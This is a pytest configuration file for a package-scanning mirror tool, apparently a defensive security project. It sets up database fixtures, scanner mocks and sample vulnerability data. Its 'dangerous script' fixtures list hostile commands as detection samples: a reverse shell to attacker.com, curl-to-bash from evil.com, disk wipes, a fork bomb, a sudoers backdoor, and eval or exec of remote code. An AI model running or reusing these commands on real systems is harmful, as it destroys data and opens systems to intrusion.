"""Pytest configuration and shared fixtures."""

import io
import gzip
import json
import os
import tarfile
import zipfile

import pytest
from pathlib import Path
from unittest.mock import MagicMock, patch

from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker

from enterprise.db.base import Base
from enterprise.db.models import Organization, Role, User, Policy, Scan, AuditLog


# ---------------------------------------------------------------------------
# Database configuration
# ---------------------------------------------------------------------------

TEST_DATABASE_URL = os.environ.get(
    "TEST_DATABASE_URL",
    "postgresql://safemirror:devpass@localhost:5432/safemirror_test",
)

_FALLBACK_DATABASE_URL = os.environ.get(
    "DATABASE_URL",
    "postgresql://safemirror:devpass@localhost:5432/safemirror",
)


def _db_reachable(url: str) -> bool:
    try:
        eng = create_engine(url)
        with eng.connect() as conn:
            conn.execute(text("SELECT 1"))
        eng.dispose()
        return True
    except Exception:
        return False


# ---------------------------------------------------------------------------
# Session-scoped: engine + table creation (once per test run)
# ---------------------------------------------------------------------------


@pytest.fixture(scope="session")
def db_engine():
    """Create a SQLAlchemy engine for the test database.

    Tries ``TEST_DATABASE_URL`` first (default: ``safemirror_test``), then
    falls back to ``DATABASE_URL`` (the dev database).  Skips all DB tests
    when no database is reachable.

    Tables are created at session start and dropped at session end.
    """
    url = TEST_DATABASE_URL if _db_reachable(TEST_DATABASE_URL) else _FALLBACK_DATABASE_URL
    if not _db_reachable(url):
        pytest.skip("No PostgreSQL database reachable — skipping DB tests")

    engine = create_engine(url, echo=False)
    Base.metadata.create_all(engine)

    yield engine

    Base.metadata.drop_all(engine)
    engine.dispose()


@pytest.fixture(scope="session")
def _session_factory(db_engine):
    """Internal: bound sessionmaker for the test engine."""
    return sessionmaker(bind=db_engine)


# ---------------------------------------------------------------------------
# Function-scoped: one session per test, rolled back automatically
# ---------------------------------------------------------------------------


@pytest.fixture()
def db_session(db_engine, _session_factory):
    """Provide a transactional database session that rolls back after each test.

    Usage::

        def test_something(db_session):
            org = Organization(name="Acme", slug="acme")
            db_session.add(org)
            db_session.flush()
            assert org.id is not None
            # rolls back automatically — no cleanup needed
    """
    connection = db_engine.connect()
    transaction = connection.begin()
    session = _session_factory(bind=connection)

    yield session

    session.close()
    transaction.rollback()
    connection.close()


# ---------------------------------------------------------------------------
# Module-scoped session (for heavier integration tests)
# ---------------------------------------------------------------------------


@pytest.fixture(scope="module")
def db_session_module(db_engine, _session_factory):
    """Module-scoped database session — shared across tests in one module.

    Data persists between tests in the same module.  All application tables
    are truncated at teardown.
    """
    session = _session_factory()
    yield session
    session.close()

    with db_engine.connect() as conn:
        for table in reversed(Base.metadata.sorted_tables):
            conn.execute(table.delete())
        conn.commit()


# ---------------------------------------------------------------------------
# Factory fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
def org_factory(db_session):
    """Factory for creating test organizations.

    Usage::

        def test_org(org_factory):
            org = org_factory(name="Acme Corp")
    """
    from tests.factories import create_organization

    def _make(**kwargs):
        return create_organization(db_session, **kwargs)

    return _make


@pytest.fixture()
def role_factory(db_session):
    """Factory for creating test roles."""
    from tests.factories import create_role

    def _make(**kwargs):
        return create_role(db_session, **kwargs)

    return _make


@pytest.fixture()
def user_factory(db_session):
    """Factory for creating test users."""
    from tests.factories import create_user

    def _make(**kwargs):
        return create_user(db_session, **kwargs)

    return _make


@pytest.fixture()
def policy_factory(db_session):
    """Factory for creating test policies."""
    from tests.factories import create_policy

    def _make(**kwargs):
        return create_policy(db_session, **kwargs)

    return _make


@pytest.fixture()
def scan_factory(db_session):
    """Factory for creating test scans."""
    from tests.factories import create_scan

    def _make(**kwargs):
        return create_scan(db_session, **kwargs)

    return _make


@pytest.fixture()
def audit_log_factory(db_session):
    """Factory for creating test audit log entries."""
    from tests.factories import create_audit_log

    def _make(**kwargs):
        return create_audit_log(db_session, **kwargs)

    return _make


@pytest.fixture
def sample_config():
    """Sample configuration dictionary."""
    return {
        "system": {
            "base_dir": "/opt/apt-mirror-system",
            "scans_dir": "/opt/apt-mirror-system/scans",
            "approvals_dir": "/opt/apt-mirror-system/approvals",
            "logs_dir": "/opt/apt-mirror-system/logs",
        },
        "scanner": {
            "type": "trivy",
            "timeout": 300,
            "workers": 4,
        },
        "policy": {
            "min_cvss_score": 7.0,
            "block_severities": ["CRITICAL", "HIGH"],
        },
        "logging": {
            "level": "INFO",
        },
        "formats": {
            "enabled": ["deb", "rpm", "wheel", "npm", "apk", "sdist"],
        },
    }


@pytest.fixture
def multi_format_config():
    """Configuration for multi-format scanning."""
    return {
        "formats": {
            "deb": {"enabled": True, "scanner": "trivy"},
            "rpm": {"enabled": True, "scanner": "trivy"},
            "wheel": {"enabled": True, "scanner": "pip-audit"},
            "sdist": {"enabled": True, "scanner": "pip-audit"},
            "npm": {"enabled": True, "scanner": "npm-audit"},
            "apk": {"enabled": True, "scanner": "trivy"},
        },
        "scanner": {
            "timeout": 300,
            "fallback": "trivy",
        },
        "policy": {
            "min_cvss_score": 7.0,
            "block_severities": ["CRITICAL", "HIGH"],
            "default_deny": True,
        },
    }


@pytest.fixture
def temp_scans_dir(tmp_path):
    """Create temporary scans directory for tests."""
    scans_dir = tmp_path / "scans"
    scans_dir.mkdir()
    return scans_dir


@pytest.fixture
def mock_trivy_scanner():
    """Mock Trivy scanner for unit tests."""
    with patch("src.scanner.scan_packages.PackageScanner._validate_scanner"):
        from src.scanner.scan_packages import PackageScanner
        scanner = PackageScanner.__new__(PackageScanner)
        scanner.scanner_type = "trivy"
        scanner.timeout = 60
        scanner.min_cvss_score = 7.0
        scanner.block_severities = ["CRITICAL", "HIGH"]
        yield scanner


@pytest.fixture
def mock_virus_scanner():
    """Mock ClamAV virus scanner for unit tests."""
    with patch("src.scanner.virus_scanner.subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(returncode=0, stdout=b"ClamAV 1.0.0")
        from src.scanner.virus_scanner import VirusScanner
        scanner = VirusScanner(timeout=60)
        yield scanner


@pytest.fixture
def sample_vulnerability():
    """Sample vulnerability dictionary for testing."""
    return {
        "cve_id": "CVE-2023-12345",
        "severity": "CRITICAL",
        "cvss_score": 9.8,
        "package": "libtest",
        "installed_version": "1.0.0",
        "fixed_version": "1.0.1",
        "title": "Test Vulnerability",
        "description": "A critical test vulnerability",
    }


@pytest.fixture
def sample_vulnerabilities():
    """List of sample vulnerabilities for testing."""
    return [
        {
            "cve_id": "CVE-2023-11111",
            "severity": "CRITICAL",
            "cvss_score": 9.8,
            "package": "openssl",
        },
        {
            "cve_id": "CVE-2023-22222",
            "severity": "HIGH",
            "cvss_score": 8.5,
            "package": "libxml2",
        },
        {
            "cve_id": "CVE-2023-33333",
            "severity": "MEDIUM",
            "cvss_score": 5.5,
            "package": "zlib",
        },
        {
            "cve_id": "CVE-2023-44444",
            "severity": "LOW",
            "cvss_score": 2.0,
            "package": "bash",
        },
    ]


@pytest.fixture
def dangerous_shell_scripts():
    """Collection of dangerous shell scripts for testing."""
    return {
        "rm_rf_root": "#!/bin/bash\nrm -rf /",
        "curl_pipe_bash": "#!/bin/bash\ncurl https://evil.com/script.sh | bash",
        "chmod_777": "#!/bin/bash\nchmod 777 /etc/passwd",
        "fork_bomb": "#!/bin/bash\n:(){ :|:& };:",
        "dd_wipe": "#!/bin/bash\ndd if=/dev/zero of=/dev/sda bs=1M",
        "eval_injection": "#!/bin/bash\neval $(curl https://evil.com/cmd)",
        "reverse_shell": "#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/443 0>&1",
        "sudoers_mod": "#!/bin/bash\necho 'evil ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
    }


@pytest.fixture
def safe_shell_scripts():
    """Collection of safe shell scripts for testing."""
    return {
        "simple_echo": "#!/bin/bash\necho 'Hello, World!'",
        "copy_file": "#!/bin/bash\ncp /usr/share/doc/pkg/* /tmp/doc/",
        "mkdir": "#!/bin/bash\nmkdir -p /var/lib/myapp",
        "chmod_normal": "#!/bin/bash\nchmod 644 /etc/myapp.conf",
        "systemctl": "#!/bin/bash\nsystemctl restart myservice",
    }


@pytest.fixture
def dangerous_python_scripts():
    """Collection of dangerous Python scripts for testing."""
    return {
        "os_system": "import os\nos.system('rm -rf /')",
        "subprocess_call": "import subprocess\nsubprocess.call(['rm', '-rf', '/'])",
        "eval_code": "code = get_input()\neval(code)",
        "exec_code": "code = download_code()\nexec(code)",
        "pickle_rce": "import pickle\npickle.loads(untrusted_data)",
    }


@pytest.fixture
def dangerous_npm_scripts():
    """Collection of dangerous NPM scripts for testing."""
    return {
        "child_process": "const { exec } = require('child_process');\nexec('rm -rf /')",
        "eval": "const code = getCode();\neval(code)",
        "function_ctor": "const fn = new Function('return eval(x)');\nfn()",
    }


# Note: fixtures from tests/fixtures/conftest.py are auto-discovered by pytest
